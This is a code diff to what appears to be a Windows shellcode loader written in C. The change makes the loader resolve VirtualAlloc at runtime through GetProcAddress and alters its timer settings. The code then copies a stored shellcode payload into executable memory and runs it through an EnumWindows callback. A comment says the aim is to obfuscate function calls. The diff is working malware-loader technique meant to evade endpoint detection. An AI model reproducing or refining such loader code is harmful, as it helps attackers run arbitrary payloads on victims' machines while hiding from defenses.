@@ -13,6 +13,7 @@ typedef struct
 TimerContext g_context;
 
 VOID CALLBACK TimerProc(HWND hWnd, UINT message, UINT_PTR timerId, DWORD dwTime);
+LPVOID (WINAPI * pAllocate) (LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
 
 int main(void)
 {
@@ -24,9 +25,10 @@ int main(void)
 	g_context.key = key;
 	g_context.payload = shellcode;
 	g_context.payloadSize = sizeof(shellcode);
+	pAllocate = (LPVOID(WINAPI *)(LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAlloc");
 
 
-	UINT_PTR timerId = SetTimer(NULL, 1, 18000, TimerProc);
+	UINT_PTR timerId = SetTimer(NULL, 1800, 1, TimerProc);
 
 	MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
@@ -46,9 +48,9 @@ VOID CALLBACK TimerProc(HWND hWnd, UINT message, UINT_PTR timerId, DWORD dwTime)
 	}
 	// Encrypt DLL and function strings. 
 	// Obfuscate function calls - using DLL pointer.
-    HANDLE hAlloc = VirtualAlloc(NULL, g_context.payloadSize , MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    memcpy(hAlloc, g_context.payload, g_context.payloadSize);
-    EnumWindows((WNDENUMPROC) hAlloc, (LPARAM) NULL);
+    void * payload_mem = pAllocate(NULL, g_context.payloadSize , MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    memcpy(payload_mem, g_context.payload, g_context.payloadSize);
+    EnumWindows((WNDENUMPROC) payload_mem, (LPARAM) NULL);
 };
 
 
